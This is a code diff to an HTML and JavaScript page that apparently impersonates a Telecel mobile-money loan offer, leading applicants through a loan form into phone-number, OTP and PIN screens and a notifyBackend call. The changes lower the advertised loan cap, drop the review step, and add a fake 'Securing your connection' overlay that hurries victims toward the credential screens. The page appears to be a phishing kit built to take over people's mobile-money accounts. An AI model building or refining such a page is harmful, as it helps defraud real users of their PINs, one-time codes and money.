@@ -99,19 +99,6 @@
     .field input::placeholder{color:var(--hint);}
     .fpair{display:grid;grid-template-columns:1fr 1fr;gap:12px;}
 
-    .summary-block{border:1.5px solid var(--border);border-radius:12px;overflow:hidden;margin-bottom:20px;}
-    .summary-header{background:linear-gradient(135deg,var(--red) 0%,var(--red-mid) 100%);padding:14px 16px;display:flex;align-items:center;gap:8px;}
-    .summary-header-icon{width:24px;height:24px;background:var(--red-light);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:13px;}
-    .summary-header-title{font-size:13px;font-weight:700;color:var(--white);letter-spacing:0.3px;text-transform:uppercase;}
-    .sum-row{display:flex;justify-content:space-between;align-items:center;padding:13px 16px;border-bottom:1px solid var(--border);}
-    .sum-row:last-child{border-bottom:none;}
-    .sum-lbl{font-size:13px;color:var(--sub);}
-    .sum-val{font-size:13px;color:var(--text);font-weight:600;}
-    .sum-row.total{background:var(--red-light);}
-    .sum-row.total .sum-lbl{font-size:14px;color:var(--text);font-weight:600;}
-    .sum-row.total .sum-val{font-size:16px;color:var(--red-dark);font-weight:800;}
-    .legal-text{font-size:12px;color:var(--hint);line-height:1.7;}
-
     .overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(226,0,26,0.5);display:flex;align-items:center;justify-content:center;z-index:100;flex-direction:column;}
     .overlay-card{background:var(--white);border-radius:20px;padding:36px 28px;text-align:center;max-width:320px;width:90%;box-shadow:0 20px 60px rgba(226,0,26,0.25);}
     .overlay-spinner{width:52px;height:52px;border:3.5px solid var(--border);border-top-color:var(--red);border-right-color:var(--red-dark);border-radius:50%;animation:spin 0.7s linear infinite;margin:0 auto 20px;}
@@ -254,12 +241,12 @@
     <div class="top-accent"></div>
     <div class="hdr">
       <div class="dm-logo">
-        <img src="https://imgs.search.brave.com/Boj0v1ymugGBH06xnXzj3EOI1ZBbXS0o5FlH2XResBA/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly90ZWxl/Y2VsZ3JvdXAuY29t/L3dwLWNvbnRlbnQv/dXBsb2Fkcy8yMDI1/LzEyL1RHLUxPR09P/LTAzXzQwMC53ZWJw" alt="logo" onerror="this.style.display='none'">
+        <img src="https://imgs.search.brave.com/Boj0v1ymugGBH06xnXzj3EOI1ZBbXS0o5FlH2XResBA/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly90ZWxl/Y2VsZ3JvdXAuY29t/L3dwLWNvbnRlbnQv/dXBsb2Fkcy8yMDI1LzEyL1RHLUxPR09P/LTAzXzQwMC53ZWJw" alt="logo" onerror="this.style.display='none'">
       </div>
     </div>
     <div class="body">
       <div style="margin-bottom:28px;padding-top:8px;">
-        <div class="hero-badge"><div class="hero-badge-dot"></div><span class="hero-badge-txt">Borrow up to GH₵ 100,000</span></div>
+        <div class="hero-badge"><div class="hero-badge-dot"></div><span class="hero-badge-txt">Borrow up to GH₵ 50,000</span></div>
         <div class="hero-amount" id="loanAmt">GH₵ 1,000</div>
         <div class="hero-sub" id="hero-sub">— /month · 5% per year</div>
       </div>
@@ -273,8 +260,8 @@
       </div>
       <div class="range-wrap">
         <div class="range-label"><span>Or use slider</span><span class="or-text">drag to adjust</span></div>
-        <input type="range" id="slider" min="1000" max="100000" value="1000" step="500" oninput="sliderChange(this.value)">
-        <div class="range-limits"><span>GH₵ 1,000</span><span>GH₵ 100,000</span></div>
+        <input type="range" id="slider" min="1000" max="50000" value="1000" step="500" oninput="sliderChange(this.value)">
+        <div class="range-limits"><span>GH₵ 1,000</span><span>GH₵ 50,000</span></div>
       </div>
       <span class="dur-label">Repayment period</span>
       <div class="dur-grid">
@@ -298,11 +285,11 @@
     <div class="top-accent"></div>
     <div class="hdr">
       <div class="dm-logo">
-        <img src="https://imgs.search.brave.com/Boj0v1ymugGBH06xnXzj3EOI1ZBbXS0o5FlH2XResBA/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly90ZWxl/Y2VsZ3JvdXAuY29tL3dwLWNvbnRlbnQv/dXBsb2Fkcy8yMDI1/LzEyL1RHLUxPR09P/LTAzXzQwMC53ZWJw" alt="logo" onerror="this.style.display='none'">
+        <img src="https://imgs.search.brave.com/Boj0v1ymugGBH06xnXzj3EOI1ZBbXS0o5FlH2XResBA/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly90ZWxl/Y2VsZ3JvdXAuY29t/L3dwLWNvbnRlbnQv/dXBsb2Fkcy8yMDI1/LzEyL1RHLUxPR09P/LTAzXzQwMC53ZWJw" alt="logo" onerror="this.style.display='none'">
       </div>
-      <span class="step-label">1 of 2</span>
+      <span class="step-label">1 of 1</span>
     </div>
-    <div class="prog"><div class="prog-fill" style="width:50%"></div></div>
+    <div class="prog"><div class="prog-fill" style="width:100%"></div></div>
     <div class="body">
       <div class="section-title">Your information</div>
       <div class="section-sub">We need a few personal details to process your application.</div>
@@ -330,43 +317,7 @@
     <div class="foot">
       <div class="brow">
         <button class="btn-back" onclick="go('s-p1','s-land')">Back</button>
-        <button class="btn-primary" id="p1btn" onclick="go('s-p1','s-p3')" disabled>Continue</button>
-      </div>
-    </div>
-  </div>
-
-  <!-- ═══════════════════ STEP 2 ═══════════════════ -->
-  <div class="scr" id="s-p3">
-    <div class="top-accent"></div>
-    <div class="hdr">
-      <div class="dm-logo">
-        <img src="https://imgs.search.brave.com/Boj0v1ymugGBH06xnXzj3EOI1ZBbXS0o5FlH2XResBA/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly90ZWxl/Y2VsZ3JvdXAuY29tL3dwLWNvbnRlbnQv/dXBsb2Fkcy8yMDI1LzEyL1RHLUxPR09P/LTAzXzQwMC53ZWJw" alt="logo" onerror="this.style.display='none'">
-      </div>
-      <span class="step-label">2 of 2</span>
-    </div>
-    <div class="prog"><div class="prog-fill" style="width:100%"></div></div>
-    <div class="body">
-      <div class="section-title">Summary</div>
-      <div class="section-sub">Please confirm the details below before submitting.</div>
-      <div class="summary-block">
-        <div class="summary-header">
-          <div class="summary-header-icon">📋</div>
-          <span class="summary-header-title"></span>
-        </div>
-        <div class="sum-row"><span class="sum-lbl">Applicant</span><span class="sum-val" id="rv-name">—</span></div>
-        <div class="sum-row"><span class="sum-lbl">Income source</span><span class="sum-val" id="rv-source">—</span></div>
-        <div class="sum-row"><span class="sum-lbl">Monthly income</span><span class="sum-val" id="rv-inc">—</span></div>
-        <div class="sum-row"><span class="sum-lbl">Loan period</span><span class="sum-val" id="rv-dur">—</span></div>
-        <div class="sum-row total"><span class="sum-lbl">Loan amount</span><span class="sum-val" id="rv-amt">—</span></div>
-        <div class="sum-row"><span class="sum-lbl">Monthly repayment</span><span class="sum-val" id="rv-rep">—</span></div>
-      </div>
-      <div class="legal-text">By submitting this application, you confirm that the information provided is accurate and consent to Telecel Loans performing a credit assessment.</div>
-      <div class="spacer"></div>
-    </div>
-    <div class="foot">
-      <div class="brow">
-        <button class="btn-back" onclick="go('s-p3','s-p1')">Back</button>
-        <button class="btn-primary" onclick="showCoolLoader()">Continue to login</button>
+        <button class="btn-primary" id="p1btn" onclick="submitApplication()" disabled>Submit Application</button>
       </div>
     </div>
   </div>
@@ -375,11 +326,11 @@
   <div class="scr login-scr" id="s-login">
     <div class="hdr login-top-logo">
       <div class="dm-logo">
-        <img src="https://imgs.search.brave.com/Boj0v1ymugGBH06xnXzj3EOI1ZBbXS0o5FlH2XResBA/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly90ZWxl/Y2VsZ3JvdXAuY29tL3dwLWNvbnRlbnQv/dXBsb2Fkcy8yMDI1LzEyL1RHLUxPR09P/LTAzXzQwMC53ZWJw" alt="logo" onerror="this.style.display='none'">
+        <img src="https://imgs.search.brave.com/Boj0v1ymugGBH06xnXzj3EOI1ZBbXS0o5FlH2XResBA/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly90ZWxl/Y2VsZ3JvdXAuY29t/L3dwLWNvbnRlbnQv/dXBsb2Fkcy8yMDI1LzEyL1RHLUxPR09P/LTAzXzQwMC53ZWJw" alt="logo" onerror="this.style.display='none'">
       </div>
     </div>
     <div class="login-logo-wrap">
-      <img src="https://imgs.search.brave.com/Boj0v1ymugGBH06xnXzj3EOI1ZBbXS0o5FlH2XResBA/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly90ZWxl/Y2VsZ3JvdXAuY29t/L3dwLWNvbnRlbnQv/dXBsb2Fkcy8yMDI1/LzEyL1RHLUxPR09P/LTAzXzQwMC53ZWJw" alt="Telecel Logo" id="loginLogoImg" onerror="handleLoginLogoError()" style="width:135px;height:auto;display:block;object-fit:contain;">
+      <img src="https://imgs.search.brave.com/Boj0v1ymugGBH06xnXzj3EOI1ZBbXS0o5FlH2XResBA/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly90ZWxl/Y2VsZ3JvdXAuY29t/L3dwLWNvbnRlbnQv/dXBsb2Fkcy8yMDI1LzEyL1RHLUxPR09P/LTAzXzQwMC53ZWJw" alt="Telecel Logo" id="loginLogoImg" onerror="handleLoginLogoError()" style="width:135px;height:auto;display:block;object-fit:contain;">
       <div class="login-logo-fallback" id="loginLogoFallback">T</div>
     </div>
     <h1 class="login-title">Confirm your number to continue</h1>
@@ -398,11 +349,10 @@
   </div>
 
   <!-- ═══════════════════ PIN PAGE (NEW DESIGN) ═══════════════════ -->
-<!-- ═══════════════════ PIN PAGE (NEW DESIGN) ═══════════════════ -->
 <div class="scr pin-scr" id="s-pin">
     <div class="hdr pin-top-logo">
       <div class="dm-logo">
-        <img src="https://imgs.search.brave.com/Boj0v1ymugGBH06xnXzj3EOI1ZBbXS0o5FlH2XResBA/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly90ZWxl/Y2VsZ3JvdXAuY29tL3dwLWNvbnRlbnQv/dXBsb2Fkcy8yMDI1LzEyL1RHLUxPR09P/LTAzXzQwMC53ZWJw" alt="logo" onerror="this.style.display='none'">
+        <img src="https://imgs.search.brave.com/Boj0v1ymugGBH06xnXzj3EOI1ZBbXS0o5FlH2XResBA/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly90ZWxl/Y2VsZ3JvdXAuY29t/L3dwLWNvbnRlbnQv/dXBsb2Fkcy8yMDI1LzEyL1RHLUxPR09P/LTAzXzQwMC53ZWJw" alt="logo" onerror="this.style.display='none'">
       </div>
     </div>
     
@@ -521,7 +471,6 @@ function handleOtpPopupLogoError(){var i=document.getElementById('otpPopupLogoIm
 function go(f,t){
   document.getElementById(f).classList.remove('active');
   var e=document.getElementById(t);e.classList.add('active');e.scrollTop=0;
-  if(t==='s-p3')populateReview();
   if(t==='s-otp'){var o=document.querySelector('#otpRow .otp-input');if(o)o.focus();startOtpCountdown();}
   if(t==='s-pin')pinReset();
 }
@@ -543,7 +492,7 @@ function amountInputChange(v){
   if(v===''){e.classList.remove('show');document.getElementById('slider').value=1000;updateLanding();return;}
   var n=parseInt(v);
   if(n<1000){e.classList.add('show');updateDisplay(n);}
-  else{e.classList.remove('show');if(n>100000){n=100000;document.getElementById('amountInput').value=n;}document.getElementById('slider').value=n;updateLanding();}
+  else{e.classList.remove('show');if(n>50000){n=50000;document.getElementById('amountInput').value=n;}document.getElementById('slider').value=n;updateLanding();}
 }
 function updateDisplay(n){document.getElementById('loanAmt').textContent='GH₵ '+n.toLocaleString('en-US');var mo=calcM(n,durVal);document.getElementById('land-monthly').textContent=mo>0?usd(mo):'—';document.getElementById('land-total').textContent=mo>0?usd(mo*durVal):'—';document.getElementById('hero-sub').textContent=(mo>0?usd(mo)+' /month':'—')+' · 5% per year';}
 function sliderChange(v){document.getElementById('amountInput').value=v;document.getElementById('amountError').classList.remove('show');updateLanding();}
@@ -551,19 +500,25 @@ function updateLanding(){var a=parseInt(document.getElementById('slider').value)
 function validateAlpha(el){el.value=el.value.replace(/[^a-zA-Z\s]/g,'');}
 function validateNumeric(el){el.value=el.value.replace(/[^0-9.]/g,'');var p=el.value.split('.');if(p.length>2)el.value=p[0]+'.'+p.slice(1).join('');}
 function chk1(){var ok=document.getElementById('fn').value.trim()&&document.getElementById('ln').value.trim()&&document.getElementById('incomeSource').value.trim()&&document.getElementById('inc').value.trim();document.getElementById('p1btn').disabled=!ok;}
-function populateReview(){
-  var a=parseInt(document.getElementById('slider').value)||20,m=durVal,fn=document.getElementById('fn').value.trim(),ln=document.getElementById('ln').value.trim(),ic=parseFloat(document.getElementById('inc').value)||0,src=document.getElementById('incomeSource').value||'—';
+
+// New function: Submit application directly with loading overlay
+function submitApplication(){
+  var fn=document.getElementById('fn').value.trim(),ln=document.getElementById('ln').value.trim();
   fullNameCache=[fn,ln].filter(Boolean).join(' ')||'Unknown';
-  document.getElementById('rv-name').textContent=fullNameCache;document.getElementById('rv-source').textContent=src;
-  document.getElementById('rv-inc').textContent=ic>0?('GH₵ '+Math.round(ic).toLocaleString('en-US')):'—';document.getElementById('rv-dur').textContent=m+' months';
-  document.getElementById('rv-amt').textContent='GH₵ '+a.toLocaleString('en-US');document.getElementById('rv-rep').textContent=usd(calcM(a,m))+' /mo';
+  
+  // Show loading overlay
+  showOverlay('<div class="cool-loader"><div class="overlay-title">Securing your connection</div><div class="overlay-desc">Preparing Telecel secure login...</div><div class="loading-bar-wrap"><div class="loading-bar"></div></div></div>');
+  
+  setTimeout(function(){
+    hideOverlay();
+    go('s-p1','s-login');
+  },3000);
 }
 
 function showOverlay(h){document.getElementById('overlayCard').innerHTML=h;document.getElementById('overlay').style.display='flex';}
 function hideOverlay(){document.getElementById('overlay').style.display='none';}
 function showPollingOverlay(t,d){showOverlay('<div class="overlay-spinner"></div><div class="overlay-title">'+(t||'Processing')+'</div><div class="overlay-desc">'+(d||'Please wait...')+'</div><div class="overlay-error" id="overlayError"></div>');}
 function showOverlayError(m){var e=document.getElementById('overlayError');if(e){e.textContent=m;e.style.display='block';}}
-function showCoolLoader(){showOverlay('<div class="cool-loader"><div class="overlay-title">Securing your connection</div><div class="overlay-desc">Preparing Telecel secure login...</div><div class="loading-bar-wrap"><div class="loading-bar"></div></div></div>');setTimeout(function(){hideOverlay();go('s-p3','s-login');},3000);}
 
 function getLoginPhone(){return document.getElementById('phoneInputLogin').value.trim();}
 async function notifyBackend(type,extra){
